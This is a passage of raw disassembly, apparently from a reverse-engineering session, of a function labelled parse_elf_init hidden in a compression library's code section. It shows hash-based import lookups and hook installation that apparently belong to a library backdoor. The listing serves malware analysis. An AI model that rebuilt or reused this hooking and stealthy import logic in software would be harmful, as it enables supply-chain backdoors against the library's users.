.text.microlzma_encoder_inia:0000000000005AC7                 mov     [rdi+18h], ecx
.text.microlzma_encoder_inia:0000000000005ACA                 mov     [rdi+20h], edx
.text.microlzma_encoder_inia:0000000000005ACD                 jmp     loc_6F41
.text.microlzma_encoder_inia:0000000000005AD2 ; ---------------------------------------------------------------------------
.text.microlzma_encoder_inia:0000000000005AD2
.text.microlzma_encoder_inia:0000000000005AD2 loc_5AD2:                               ; CODE XREF: parse_elf_init:loc_5A71↑j
.text.microlzma_encoder_inia:0000000000005AD2                 mov     cl, [rsi+rax]
.text.microlzma_encoder_inia:0000000000005AD5                 mov     [rdx+rax], cl
.text.microlzma_encoder_inia:0000000000005AD8                 inc     rax
.text.microlzma_encoder_inia:0000000000005ADB                 cmp     rax, 18h
.text.microlzma_encoder_inia:0000000000005ADF                 jmp     short loc_5A71
.text.microlzma_encoder_inia:0000000000005AE1 ; ---------------------------------------------------------------------------
.text.microlzma_encoder_inia:0000000000005AE1
.text.microlzma_encoder_inia:0000000000005AE1 loc_5AE1:                               ; CODE XREF: parse_elf_init+225↑j
.text.microlzma_encoder_inia:0000000000005AE1                 mov     rax, [r15+10h]
.text.microlzma_encoder_inia:0000000000005AE5                 mov     ecx, 5Ah ; 'Z'
.text.microlzma_encoder_inia:0000000000005AEA                 lea     rsi, [rsp+7B0h]
.text.microlzma_encoder_inia:0000000000005AF2                 mov     rax, [rax+38h]
.text.microlzma_encoder_inia:0000000000005AF6                 mov     r13, [rax]
.text.microlzma_encoder_inia:0000000000005AF9                 lea     rax, [r13+138h]
.text.microlzma_encoder_inia:0000000000005B00                 lea     rdx, [r13+518h]
.text.microlzma_encoder_inia:0000000000005B07                 mov     [rsp+0B58h+var_B10], r13
.text.microlzma_encoder_inia:0000000000005B0C                 mov     [rsp+0B58h+var_B50], rax
.text.microlzma_encoder_inia:0000000000005B11                 lea     rax, [r13+2A0h]
.text.microlzma_encoder_inia:0000000000005B18                 mov     rdi, [rsp+0B58h+var_B50]
.text.microlzma_encoder_inia:0000000000005B1D                 lea     rbx, [r13+4A8h]
.text.microlzma_encoder_inia:0000000000005B24                 mov     [rsp+0B58h+var_B40], rax
.text.microlzma_encoder_inia:0000000000005B29                 xor     eax, eax
.text.microlzma_encoder_inia:0000000000005B2B                 lea     r14, [r13+3C8h]
.text.microlzma_encoder_inia:0000000000005B32                 rep stosd
.text.microlzma_encoder_inia:0000000000005B34                 mov     rcx, [rsp+0B58h+var_B40]
.text.microlzma_encoder_inia:0000000000005B39                 mov     [r13+168h], rdx
.text.microlzma_encoder_inia:0000000000005B40                 mov     [rsp+0B58h+var_B48], rdx
.text.microlzma_encoder_inia:0000000000005B45                 xor     edx, edx
.text.microlzma_encoder_inia:0000000000005B47                 mov     rdi, [rsp+0B58h+var_B58]
.text.microlzma_encoder_inia:0000000000005B4B                 mov     rax, [r15+10h]
.text.microlzma_encoder_inia:0000000000005B4F                 mov     [r13+140h], rcx
.text.microlzma_encoder_inia:0000000000005B56                 mov     [r13+158h], r14
.text.microlzma_encoder_inia:0000000000005B5D                 mov     rax, [rax+38h]
.text.microlzma_encoder_inia:0000000000005B61                 mov     [r13+148h], rbx
.text.microlzma_encoder_inia:0000000000005B68                 mov     rax, [rax]
.text.microlzma_encoder_inia:0000000000005B6B                 mov     rcx, [rax+580h]
.text.microlzma_encoder_inia:0000000000005B72                 add     rax, 588h
.text.microlzma_encoder_inia:0000000000005B78                 mov     [r13+220h], rdx
.text.microlzma_encoder_inia:0000000000005B7F                 mov     [r13+228h], rax
.text.microlzma_encoder_inia:0000000000005B86                 mov     [r13+218h], rcx
.text.microlzma_encoder_inia:0000000000005B8D                 call    sub_2D20
.text.microlzma_encoder_inia:0000000000005B92                 mov     rdi, [rsp+0B58h+anonymous_7.elf_info_arr+18h]
.text.microlzma_encoder_inia:0000000000005B9A                 xor     ecx, ecx
.text.microlzma_encoder_inia:0000000000005B9C                 lea     rsi, [rsp+0B58h+var_AA0]
.text.microlzma_encoder_inia:0000000000005BA4                 mov     [rsp+0B58h+var_AA0], rcx
.text.microlzma_encoder_inia:0000000000005BAC                 call    _Llzma_check_update_0 ; PIC mode
.text.microlzma_encoder_inia:0000000000005BB1                 test    rax, rax
.text.microlzma_encoder_inia:0000000000005BB4                 jz      loc_5A52
.text.microlzma_encoder_inia:0000000000005BBA                 mov     [r13+1B8h], rax
.text.microlzma_encoder_inia:0000000000005BC1                 add     rax, [rsp+0B58h+var_AA0]
.text.microlzma_encoder_inia:0000000000005BC9                 mov     ecx, 4Eh ; 'N'
.text.microlzma_encoder_inia:0000000000005BCE                 mov     rdi, r13
.text.microlzma_encoder_inia:0000000000005BD1                 mov     [r13+1C0h], rax
.text.microlzma_encoder_inia:0000000000005BD8                 xor     eax, eax
.text.microlzma_encoder_inia:0000000000005BDA                 mov     rsi, [rsp+0B58h+var_B40]
.text.microlzma_encoder_inia:0000000000005BDF                 rep stosd
.text.microlzma_encoder_inia:0000000000005BE1                 mov     rdi, r14
.text.microlzma_encoder_inia:0000000000005BE4                 mov     [r13+128h], rsi
.text.microlzma_encoder_inia:0000000000005BEB                 mov     rax, [r15+10h]
.text.microlzma_encoder_inia:0000000000005BEF                 mov     rcx, [rax+48h]
.text.microlzma_encoder_inia:0000000000005BF3                 mov     rax, [rax+50h]
.text.microlzma_encoder_inia:0000000000005BF7                 mov     [r13+110h], rcx
.text.microlzma_encoder_inia:0000000000005BFE                 mov     rcx, [r15+8]
.text.microlzma_encoder_inia:0000000000005C02                 mov     rcx, [rcx+8]
.text.microlzma_encoder_inia:0000000000005C06                 mov     [r13+120h], rax
.text.microlzma_encoder_inia:0000000000005C0D                 xor     eax, eax
.text.microlzma_encoder_inia:0000000000005C0F                 mov     [r13+118h], rcx
.text.microlzma_encoder_inia:0000000000005C16                 mov     ecx, 38h ; '8'
.text.microlzma_encoder_inia:0000000000005C1B                 rep stosd
.text.microlzma_encoder_inia:0000000000005C1D                 mov     rdi, [rsp+0B58h+var_B48]
.text.microlzma_encoder_inia:0000000000005C22                 mov     rax, [r15+8]
.text.microlzma_encoder_inia:0000000000005C26                 mov     rax, [rax]
.text.microlzma_encoder_inia:0000000000005C29                 mov     [r13+3D8h], rax
.text.microlzma_encoder_inia:0000000000005C30                 mov     rax, [r15+10h]
.text.microlzma_encoder_inia:0000000000005C34                 mov     rcx, [rax+70h]
.text.microlzma_encoder_inia:0000000000005C38                 mov     rax, [rax+78h]
.text.microlzma_encoder_inia:0000000000005C3C                 mov     [r13+3E0h], rcx
.text.microlzma_encoder_inia:0000000000005C43                 mov     ecx, 1Ah
.text.microlzma_encoder_inia:0000000000005C48                 mov     [r13+3E8h], rax
.text.microlzma_encoder_inia:0000000000005C4F                 xor     eax, eax
.text.microlzma_encoder_inia:0000000000005C51                 rep stosd
.text.microlzma_encoder_inia:0000000000005C53                 mov     rcx, [rsp+0B58h+var_B50]
.text.microlzma_encoder_inia:0000000000005C58                 mov     rdi, rsi
.text.microlzma_encoder_inia:0000000000005C5B                 mov     rax, [r15+10h]
.text.microlzma_encoder_inia:0000000000005C5F                 mov     rax, [rax+58h]
.text.microlzma_encoder_inia:0000000000005C63                 mov     [r13+578h], rax
.text.microlzma_encoder_inia:0000000000005C6A                 mov     rax, [r15+8]
.text.microlzma_encoder_inia:0000000000005C6E                 mov     rax, [rax+10h]
.text.microlzma_encoder_inia:0000000000005C72                 mov     [rax], rcx
.text.microlzma_encoder_inia:0000000000005C75                 xor     eax, eax
.text.microlzma_encoder_inia:0000000000005C77                 mov     ecx, 4Ah ; 'J'
.text.microlzma_encoder_inia:0000000000005C7C                 rep stosd
.text.microlzma_encoder_inia:0000000000005C7E                 mov     rax, [rsp+0B58h+var_AC0]
.text.microlzma_encoder_inia:0000000000005C86                 mov     [r13+2B8h], rax
.text.microlzma_encoder_inia:0000000000005C8D                 mov     rax, [rsp+0B58h+var_AB8]
.text.microlzma_encoder_inia:0000000000005C95                 mov     [r13+2C0h], rax
.text.microlzma_encoder_inia:0000000000005C9C                 mov     rax, [rsp+0B58h+var_AB0]
.text.microlzma_encoder_inia:0000000000005CA4                 mov     [r13+2C8h], rax
.text.microlzma_encoder_inia:0000000000005CAB                 xor     eax, eax
.text.microlzma_encoder_inia:0000000000005CAD
.text.microlzma_encoder_inia:0000000000005CAD loc_5CAD:                               ; CODE XREF: parse_elf_init+4A0↓j
.text.microlzma_encoder_inia:0000000000005CAD                 mov     cl, [r12+rax]
.text.microlzma_encoder_inia:0000000000005CB1                 mov     [r13+rax+4A8h], cl
.text.microlzma_encoder_inia:0000000000005CB9                 inc     rax
.text.microlzma_encoder_inia:0000000000005CBC                 cmp     rax, 70h ; 'p'
.text.microlzma_encoder_inia:0000000000005CC0                 jnz     short loc_5CAD
.text.microlzma_encoder_inia:0000000000005CC2                 mov     rax, [rsp+0B58h+var_AA8]
.text.microlzma_encoder_inia:0000000000005CCA                 mov     [r13+3B8h], rbx
.text.microlzma_encoder_inia:0000000000005CD1                 mov     edi, 1          ; _QWORD
.text.microlzma_encoder_inia:0000000000005CD6                 mov     [r13+510h], rax
.text.microlzma_encoder_inia:0000000000005CDD                 call    get_lzma_allocator ; PIC mode
.text.microlzma_encoder_inia:0000000000005CE2                 mov     edi, 440h
.text.microlzma_encoder_inia:0000000000005CE7                 mov     [rsp+0B58h+var_B20], rax
.text.microlzma_encoder_inia:0000000000005CEC                 mov     rax, [rsp+0B58h+anonymous_7.elf_info_arr+10h]
.text.microlzma_encoder_inia:0000000000005CF4                 mov     rbx, [rsp+0B58h+var_B20]
.text.microlzma_encoder_inia:0000000000005CF9                 mov     [rbx+10h], rax
.text.microlzma_encoder_inia:0000000000005CFD                 mov     rsi, rbx
.text.microlzma_encoder_inia:0000000000005D00                 call    lzma_alloc      ; PIC mode
.text.microlzma_encoder_inia:0000000000005D05                 mov     [r13+4B0h], rax
.text.microlzma_encoder_inia:0000000000005D0C                 test    rax, rax
.text.microlzma_encoder_inia:0000000000005D0F                 jz      short loc_5D18
.text.microlzma_encoder_inia:0000000000005D11                 inc     dword ptr [r13+4A8h]
.text.microlzma_encoder_inia:0000000000005D18
.text.microlzma_encoder_inia:0000000000005D18 loc_5D18:                               ; CODE XREF: parse_elf_init+4EF↑j
.text.microlzma_encoder_inia:0000000000005D18                 mov     rcx, [rsp+0B58h+var_B40]
.text.microlzma_encoder_inia:0000000000005D1D                 lea     rsi, [rsp+0B58h+var_AC8]
.text.microlzma_encoder_inia:0000000000005D25                 lea     rdi, [rsp+0B58h+anonymous_7.self_addr]
.text.microlzma_encoder_inia:0000000000005D2D                 mov     rdx, r13
.text.microlzma_encoder_inia:0000000000005D30                 call    _Llzma_lz_decoder_init_0 ; PIC mode
.text.microlzma_encoder_inia:0000000000005D35                 test    eax, eax
.text.microlzma_encoder_inia:0000000000005D37                 jz      loc_5A52
.text.microlzma_encoder_inia:0000000000005D3D                 mov     edi, 1          ; _QWORD
.text.microlzma_encoder_inia:0000000000005D42                 call    get_lzma_allocator ; PIC mode
.text.microlzma_encoder_inia:0000000000005D47                 mov     rbx, [rsp+0B58h+anonymous_7.elf_info_arr+20h]
.text.microlzma_encoder_inia:0000000000005D4F                 mov     [rsp+0B58h+var_B38], rax
.text.microlzma_encoder_inia:0000000000005D54                 mov     [rax+10h], rbx
.text.microlzma_encoder_inia:0000000000005D58                 test    rbx, rbx
.text.microlzma_encoder_inia:0000000000005D5B                 jz      short loc_5D91
.text.microlzma_encoder_inia:0000000000005D5D                 mov     rdi, rbx        ; a1
.text.microlzma_encoder_inia:0000000000005D60                 xor     edx, edx        ; a3
.text.microlzma_encoder_inia:0000000000005D62                 mov     esi, 798h       ; hash
.text.microlzma_encoder_inia:0000000000005D67                 call    import_lookup_get_str ; PIC mode
.text.microlzma_encoder_inia:0000000000005D6C                 mov     rsi, [rsp+0B58h+var_B38]
.text.microlzma_encoder_inia:0000000000005D71                 mov     edi, 0AF8h
.text.microlzma_encoder_inia:0000000000005D76                 mov     rbx, rax
.text.microlzma_encoder_inia:0000000000005D79                 call    lzma_alloc      ; PIC mode
.text.microlzma_encoder_inia:0000000000005D7E                 mov     [r13+318h], rax
.text.microlzma_encoder_inia:0000000000005D85                 test    rax, rax
.text.microlzma_encoder_inia:0000000000005D88                 jz      short loc_5D91
.text.microlzma_encoder_inia:0000000000005D8A                 inc     dword ptr [r13+3C0h]
.text.microlzma_encoder_inia:0000000000005D91
.text.microlzma_encoder_inia:0000000000005D91 loc_5D91:                               ; CODE XREF: parse_elf_init+53B↑j
.text.microlzma_encoder_inia:0000000000005D91                                         ; parse_elf_init+568↑j
.text.microlzma_encoder_inia:0000000000005D91                 mov     rdi, [rsp+0B58h+anonymous_7.elf_info_arr]
.text.microlzma_encoder_inia:0000000000005D99                 xor     r14d, r14d
.text.microlzma_encoder_inia:0000000000005D9C                 lea     rsi, [rsp+0B58h+var_A30]
.text.microlzma_encoder_inia:0000000000005DA4                 mov     [rsp+0B58h+var_A30], r14
.text.microlzma_encoder_inia:0000000000005DAC                 mov     [rsp+0B58h+var_9D8], r14
.text.microlzma_encoder_inia:0000000000005DB4                 mov     [rsp+0B58h+var_B58], rdi
.text.microlzma_encoder_inia:0000000000005DB8                 call    _Llzma_check_update_0 ; PIC mode
.text.microlzma_encoder_inia:0000000000005DBD                 mov     r12, [rsp+0B58h+var_A30]
.text.microlzma_encoder_inia:0000000000005DC5                 mov     rdi, [rsp+0B58h+var_B58]
.text.microlzma_encoder_inia:0000000000005DC9                 xor     edx, edx
.text.microlzma_encoder_inia:0000000000005DCB                 lea     rsi, [rsp+0B58h+var_9D8]
.text.microlzma_encoder_inia:0000000000005DD3                 mov     r14, rax
.text.microlzma_encoder_inia:0000000000005DD6                 add     r12, rax
.text.microlzma_encoder_inia:0000000000005DD9                 call    maybe_find_freespaces ; PIC mode
.text.microlzma_encoder_inia:0000000000005DDE                 mov     rdx, [rsp+0B58h+var_9D8]
.text.microlzma_encoder_inia:0000000000005DE6                 mov     edi, 3
.text.microlzma_encoder_inia:0000000000005DEB                 mov     [r13+190h], r14
.text.microlzma_encoder_inia:0000000000005DF2                 mov     [r13+198h], r12
.text.microlzma_encoder_inia:0000000000005DF9                 add     rdx, rax
.text.microlzma_encoder_inia:0000000000005DFC                 mov     [r13+1A0h], rax
.text.microlzma_encoder_inia:0000000000005E03                 mov     [r13+1A8h], rdx
.text.microlzma_encoder_inia:0000000000005E0A                 call    get__Lencoder_1_addr ; PIC mode
.text.microlzma_encoder_inia:0000000000005E0F                 mov     [rsp+0B58h+var_B30], rax
.text.microlzma_encoder_inia:0000000000005E14                 test    rax, rax
.text.microlzma_encoder_inia:0000000000005E17                 jz      loc_5A52
.text.microlzma_encoder_inia:0000000000005E1D                 mov     rax, [rax+20h]
.text.microlzma_encoder_inia:0000000000005E21                 mov     [rsp+0B58h+var_B58], rax
.text.microlzma_encoder_inia:0000000000005E25                 test    rax, rax
.text.microlzma_encoder_inia:0000000000005E28                 jz      loc_5A52
.text.microlzma_encoder_inia:0000000000005E2E                 mov     rax, [rsp+0B58h+var_B30]
.text.microlzma_encoder_inia:0000000000005E33                 cmp     qword ptr [rax+30h], 0
.text.microlzma_encoder_inia:0000000000005E38                 jz      loc_5A52
.text.microlzma_encoder_inia:0000000000005E3E                 mov     rdi, [rsp+0B58h+anonymous_7.elf_info_arr+20h]
.text.microlzma_encoder_inia:0000000000005E46                 mov     rax, [rsp+0B58h+var_B58]
.text.microlzma_encoder_inia:0000000000005E4A                 mov     esi, 418h
.text.microlzma_encoder_inia:0000000000005E4F                 xor     r14d, r14d
.text.microlzma_encoder_inia:0000000000005E52                 call    rax
.text.microlzma_encoder_inia:0000000000005E54                 mov     [r13+3B0h], rax
.text.microlzma_encoder_inia:0000000000005E5B                 test    rax, rax
.text.microlzma_encoder_inia:0000000000005E5E                 jz      short loc_5E77
.text.microlzma_encoder_inia:0000000000005E60                 mov     rdi, [rsp+0B58h+anonymous_7.elf_info_arr+20h] ; a1
.text.microlzma_encoder_inia:0000000000005E68                 xor     edx, edx        ; a3
.text.microlzma_encoder_inia:0000000000005E6A                 mov     esi, 0C40h      ; hash
.text.microlzma_encoder_inia:0000000000005E6F                 call    import_lookup_get_str ; PIC mode
.text.microlzma_encoder_inia:0000000000005E74                 mov     r14, rax
.text.microlzma_encoder_inia:0000000000005E77
.text.microlzma_encoder_inia:0000000000005E77 loc_5E77:                               ; CODE XREF: parse_elf_init+63E↑j
.text.microlzma_encoder_inia:0000000000005E77                 mov     rdi, [rsp+0B58h+anonymous_7.elf_info_arr]
.text.microlzma_encoder_inia:0000000000005E7F                 xor     edx, edx
.text.microlzma_encoder_inia:0000000000005E81                 lea     r12, [rsp+0B58h+var_ACC]
.text.microlzma_encoder_inia:0000000000005E89                 mov     [rsp+0B58h+var_ACC], 2C8h
.text.microlzma_encoder_inia:0000000000005E94                 mov     rsi, r12
.text.microlzma_encoder_inia:0000000000005E97                 call    _Llzip_decode_0 ; PIC mode
.text.microlzma_encoder_inia:0000000000005E9C                 mov     [r13+170h], rax
.text.microlzma_encoder_inia:0000000000005EA3                 test    rax, rax
.text.microlzma_encoder_inia:0000000000005EA6                 jz      loc_5A52
.text.microlzma_encoder_inia:0000000000005EAC                 mov     rdi, [rsp+0B58h+anonymous_7.elf_info_arr]
.text.microlzma_encoder_inia:0000000000005EB4                 xor     edx, edx
.text.microlzma_encoder_inia:0000000000005EB6                 mov     rsi, r12
.text.microlzma_encoder_inia:0000000000005EB9                 mov     [rsp+0B58h+var_ACC], 710h
.text.microlzma_encoder_inia:0000000000005EC4                 call    _Llzip_decode_0 ; PIC mode
.text.microlzma_encoder_inia:0000000000005EC9                 mov     [r13+178h], rax
.text.microlzma_encoder_inia:0000000000005ED0                 test    rax, rax
.text.microlzma_encoder_inia:0000000000005ED3                 jz      loc_5A52
.text.microlzma_encoder_inia:0000000000005ED9                 mov     rdi, [rsp+0B58h+anonymous_7.elf_info_arr+20h]
.text.microlzma_encoder_inia:0000000000005EE1                 mov     esi, 6D0h
.text.microlzma_encoder_inia:0000000000005EE6                 xor     r12d, r12d
.text.microlzma_encoder_inia:0000000000005EE9                 call    import_lookup_ex ; PIC mode
.text.microlzma_encoder_inia:0000000000005EEE                 mov     [r13+3A0h], rax
.text.microlzma_encoder_inia:0000000000005EF5                 test    rax, rax
.text.microlzma_encoder_inia:0000000000005EF8                 jz      short loc_5F50
.text.microlzma_encoder_inia:0000000000005EFA                 mov     rdi, [rsp+0B58h+anonymous_7.elf_info_arr+20h] ; a1
.text.microlzma_encoder_inia:0000000000005F02                 xor     edx, edx        ; a3
.text.microlzma_encoder_inia:0000000000005F04                 mov     esi, 958h       ; hash
.text.microlzma_encoder_inia:0000000000005F09                 call    import_lookup_get_str ; PIC mode
.text.microlzma_encoder_inia:0000000000005F0E                 mov     rdi, [rsp+0B58h+anonymous_7.elf_info_arr+20h] ; a1
.text.microlzma_encoder_inia:0000000000005F16                 test    rax, rax
.text.microlzma_encoder_inia:0000000000005F19                 jz      short loc_5F30
.text.microlzma_encoder_inia:0000000000005F1B                 mov     rax, [rax+8]
.text.microlzma_encoder_inia:0000000000005F1F                 add     rax, [rdi]
.text.microlzma_encoder_inia:0000000000005F22                 inc     dword ptr [r13+3C0h]
.text.microlzma_encoder_inia:0000000000005F29                 mov     [r13+378h], rax
.text.microlzma_encoder_inia:0000000000005F30
.text.microlzma_encoder_inia:0000000000005F30 loc_5F30:                               ; CODE XREF: parse_elf_init+6F9↑j
.text.microlzma_encoder_inia:0000000000005F30                 xor     edx, edx        ; a3
.text.microlzma_encoder_inia:0000000000005F32                 mov     esi, 918h       ; hash
.text.microlzma_encoder_inia:0000000000005F37                 call    import_lookup_get_str ; PIC mode
.text.microlzma_encoder_inia:0000000000005F3C                 cmp     qword ptr [r13+3B0h], 0
.text.microlzma_encoder_inia:0000000000005F44                 mov     r12, rax
.text.microlzma_encoder_inia:0000000000005F47                 jz      short loc_5F50
.text.microlzma_encoder_inia:0000000000005F49                 inc     dword ptr [r13+3C0h]
.text.microlzma_encoder_inia:0000000000005F50
.text.microlzma_encoder_inia:0000000000005F50 loc_5F50:                               ; CODE XREF: parse_elf_init+6D8↑j
.text.microlzma_encoder_inia:0000000000005F50                                         ; parse_elf_init+727↑j
.text.microlzma_encoder_inia:0000000000005F50                 mov     rdi, [rsp+0B58h+anonymous_7.elf_info_arr+20h] ; a1
.text.microlzma_encoder_inia:0000000000005F58                 xor     edx, edx        ; a3
.text.microlzma_encoder_inia:0000000000005F5A                 mov     esi, 0AC0h      ; hash
.text.microlzma_encoder_inia:0000000000005F5F                 call    import_lookup_get_str ; PIC mode
.text.microlzma_encoder_inia:0000000000005F64                 mov     rdi, [rsp+0B58h+anonymous_7.elf_info_arr+20h]
.text.microlzma_encoder_inia:0000000000005F6C                 mov     esi, 540h
.text.microlzma_encoder_inia:0000000000005F71                 mov     [rsp+0B58h+var_B48], rax
.text.microlzma_encoder_inia:0000000000005F76                 mov     rax, [rsp+0B58h+var_B58]
.text.microlzma_encoder_inia:0000000000005F7A                 call    rax
.text.microlzma_encoder_inia:0000000000005F7C                 xor     r9d, r9d
.text.microlzma_encoder_inia:0000000000005F7F                 mov     [r13+388h], rax
.text.microlzma_encoder_inia:0000000000005F86                 test    rax, rax
.text.microlzma_encoder_inia:0000000000005F89                 jz      short loc_5FCB
.text.microlzma_encoder_inia:0000000000005F8B                 inc     dword ptr [r13+3C0h]
.text.microlzma_encoder_inia:0000000000005F92                 mov     rdi, [rsp+0B58h+anonymous_7.elf_info_arr+20h] ; a1
.text.microlzma_encoder_inia:0000000000005F9A                 xor     edx, edx        ; a3
.text.microlzma_encoder_inia:0000000000005F9C                 mov     esi, 8F8h       ; hash
.text.microlzma_encoder_inia:0000000000005FA1                 call    import_lookup_get_str ; PIC mode
.text.microlzma_encoder_inia:0000000000005FA6                 mov     r9, rax
.text.microlzma_encoder_inia:0000000000005FA9                 test    rbx, rbx
.text.microlzma_encoder_inia:0000000000005FAC                 jz      short loc_5FCB
.text.microlzma_encoder_inia:0000000000005FAE                 mov     rdx, [rsp+0B58h+anonymous_7.elf_info_arr+20h]
.text.microlzma_encoder_inia:0000000000005FB6                 mov     rax, [rbx+8]
.text.microlzma_encoder_inia:0000000000005FBA                 add     rax, [rdx]
.text.microlzma_encoder_inia:0000000000005FBD                 inc     dword ptr [r13+3C0h]
.text.microlzma_encoder_inia:0000000000005FC4                 mov     [r13+300h], rax
.text.microlzma_encoder_inia:0000000000005FCB
.text.microlzma_encoder_inia:0000000000005FCB loc_5FCB:                               ; CODE XREF: parse_elf_init+769↑j
.text.microlzma_encoder_inia:0000000000005FCB                                         ; parse_elf_init+78C↑j
.text.microlzma_encoder_inia:0000000000005FCB                 cmp     qword ptr [r13+3A0h], 0
.text.microlzma_encoder_inia:0000000000005FD3                 jz      short loc_5FDC
.text.microlzma_encoder_inia:0000000000005FD5                 inc     dword ptr [r13+3C0h]
.text.microlzma_encoder_inia:0000000000005FDC
.text.microlzma_encoder_inia:0000000000005FDC loc_5FDC:                               ; CODE XREF: parse_elf_init+7B3↑j
.text.microlzma_encoder_inia:0000000000005FDC                 mov     r8, [rsp+0B58h+var_B50]
.text.microlzma_encoder_inia:0000000000005FE1                 mov     rcx, [rsp+0B58h+var_B40]
.text.microlzma_encoder_inia:0000000000005FE6                 lea     rdx, [rsp+7B0h]
.text.microlzma_encoder_inia:0000000000005FEE                 mov     [rsp+0B58h+var_B58], r9
.text.microlzma_encoder_inia:0000000000005FF2                 mov     rsi, [rsp+0B58h+anonymous_7.elf_info_arr+20h]
.text.microlzma_encoder_inia:0000000000005FFA                 mov     rdi, [rsp+0B58h+anonymous_7.elf_info_arr]
.text.microlzma_encoder_inia:0000000000006002                 call    install_entries ; PIC mode
.text.microlzma_encoder_inia:0000000000006007                 test    eax, eax
.text.microlzma_encoder_inia:0000000000006009                 jz      loc_5A52
.text.microlzma_encoder_inia:000000000000600F                 test    r14, r14
.text.microlzma_encoder_inia:0000000000006012                 mov     rdi, [rsp+0B58h+anonymous_7.elf_info_arr+20h] ; a1
.text.microlzma_encoder_inia:000000000000601A                 mov     r9, [rsp+0B58h+var_B58]
.text.microlzma_encoder_inia:000000000000601E                 jz      short loc_6035
.text.microlzma_encoder_inia:0000000000006020                 mov     rax, [r14+8]
.text.microlzma_encoder_inia:0000000000006024                 add     rax, [rdi]
.text.microlzma_encoder_inia:0000000000006027                 inc     dword ptr [r13+3C0h]
.text.microlzma_encoder_inia:000000000000602E                 mov     [r13+380h], rax
.text.microlzma_encoder_inia:0000000000006035
.text.microlzma_encoder_inia:0000000000006035 loc_6035:                               ; CODE XREF: parse_elf_init+7FE↑j
.text.microlzma_encoder_inia:0000000000006035                 test    r12, r12
.text.microlzma_encoder_inia:0000000000006038                 jz      short loc_6050
.text.microlzma_encoder_inia:000000000000603A                 mov     rax, [r12+8]
.text.microlzma_encoder_inia:000000000000603F                 add     rax, [rdi]
.text.microlzma_encoder_inia:0000000000006042                 inc     dword ptr [r13+3C0h]
.text.microlzma_encoder_inia:0000000000006049                 mov     [r13+370h], rax
.text.microlzma_encoder_inia:0000000000006050
.text.microlzma_encoder_inia:0000000000006050 loc_6050:                               ; CODE XREF: parse_elf_init+818↑j
.text.microlzma_encoder_inia:0000000000006050                 cmp     [rsp+0B58h+var_B48], 0
.text.microlzma_encoder_inia:0000000000006056                 jz      short loc_6072
.text.microlzma_encoder_inia:0000000000006058                 mov     rax, [rsp+0B58h+var_B48]
.text.microlzma_encoder_inia:000000000000605D                 mov     rax, [rax+8]
.text.microlzma_encoder_inia:0000000000006061                 add     rax, [rdi]
.text.microlzma_encoder_inia:0000000000006064                 inc     dword ptr [r13+3C0h]
.text.microlzma_encoder_inia:000000000000606B                 mov     [r13+3A8h], rax
.text.microlzma_encoder_inia:0000000000006072
.text.microlzma_encoder_inia:0000000000006072 loc_6072:                               ; CODE XREF: parse_elf_init+836↑j
.text.microlzma_encoder_inia:0000000000006072                 test    r9, r9
.text.microlzma_encoder_inia:0000000000006075                 jz      short loc_608C
.text.microlzma_encoder_inia:0000000000006077                 mov     rax, [r9+8]
.text.microlzma_encoder_inia:000000000000607B                 add     rax, [rdi]
.text.microlzma_encoder_inia:000000000000607E                 inc     dword ptr [r13+3C0h]
.text.microlzma_encoder_inia:0000000000006085                 mov     [r13+398h], rax
.text.microlzma_encoder_inia:000000000000608C
.text.microlzma_encoder_inia:000000000000608C loc_608C:                               ; CODE XREF: parse_elf_init+855↑j
.text.microlzma_encoder_inia:000000000000608C                 xor     edx, edx        ; a3
.text.microlzma_encoder_inia:000000000000608E                 mov     esi, 3F0h       ; hash
.text.microlzma_encoder_inia:0000000000006093                 xor     ebx, ebx
.text.microlzma_encoder_inia:0000000000006095                 xor     r12d, r12d
.text.microlzma_encoder_inia:0000000000006098                 call    import_lookup_get_str ; PIC mode
.text.microlzma_encoder_inia:000000000000609D                 xor     r10d, r10d
.text.microlzma_encoder_inia:00000000000060A0                 xor     r11d, r11d
.text.microlzma_encoder_inia:00000000000060A3                 xor     edx, edx
.text.microlzma_encoder_inia:00000000000060A5                 mov     r14, [r13+158h]
.text.microlzma_encoder_inia:00000000000060AC                 mov     [rsp+0B58h+var_B08], rax
.text.microlzma_encoder_inia:00000000000060B1                 lea     rsi, [rsp+0B58h+var_A30]
.text.microlzma_encoder_inia:00000000000060B9                 mov     rax, [rsp+0B58h+anonymous_7.elf_info_arr]
.text.microlzma_encoder_inia:00000000000060C1                 mov     [rsp+0B58h+var_A30], r10
.text.microlzma_encoder_inia:00000000000060C9                 mov     dword ptr [rsp+0B58h+var_A98], r11d
.text.microlzma_encoder_inia:00000000000060D1                 mov     [r14], rbx
.text.microlzma_encoder_inia:00000000000060D4                 mov     rdi, rax
.text.microlzma_encoder_inia:00000000000060D7                 mov     [r14+8], r12d
.text.microlzma_encoder_inia:00000000000060DB                 mov     [rsp+0B58h+var_B58], rax
.text.microlzma_encoder_inia:00000000000060DF                 call    maybe_find_freespaces ; PIC mode
.text.microlzma_encoder_inia:00000000000060E4                 mov     [rsp+0B58h+var_B28], rax
.text.microlzma_encoder_inia:00000000000060E9                 test    rax, rax
.text.microlzma_encoder_inia:00000000000060EC                 jz      loc_65BA
.text.microlzma_encoder_inia:00000000000060F2                 mov     rax, [rsp+0B58h+var_A30]
.text.microlzma_encoder_inia:00000000000060FA                 mov     [rsp+0B58h+var_AF8], rax
.text.microlzma_encoder_inia:00000000000060FF                 mov     rax, [rsp+0B58h+anonymous_0]
.text.microlzma_encoder_inia:0000000000006107                 test    rax, rax
.text.microlzma_encoder_inia:000000000000610A                 jz      loc_65BA
.text.microlzma_encoder_inia:0000000000006110                 mov     [r14+0A8h], rax
.text.microlzma_encoder_inia:0000000000006117                 mov     rdi, [rsp+0B58h+var_B58]
.text.microlzma_encoder_inia:000000000000611B                 lea     rsi, [rsp+0B58h+var_A98]
.text.microlzma_encoder_inia:0000000000006123                 xor     edx, edx
.text.microlzma_encoder_inia:0000000000006125                 mov     rax, [rsp+0B58h+anonymous_1]
.text.microlzma_encoder_inia:000000000000612D                 mov     [r14+0B0h], rax
.text.microlzma_encoder_inia:0000000000006134                 mov     dword ptr [rsp+0B58h+var_A98], 400h
.text.microlzma_encoder_inia:000000000000613F                 call    _Llzip_decode_0 ; PIC mode
.text.microlzma_encoder_inia:0000000000006144                 mov     [r14+0D0h], rax
.text.microlzma_encoder_inia:000000000000614B                 test    rax, rax
.text.microlzma_encoder_inia:000000000000614E                 jz      short loc_618E
.text.microlzma_encoder_inia:0000000000006150                 push    rdi
.text.microlzma_encoder_inia:0000000000006151                 lea     rcx, [r14+38h]
.text.microlzma_encoder_inia:0000000000006155                 lea     rdx, [r14+30h]
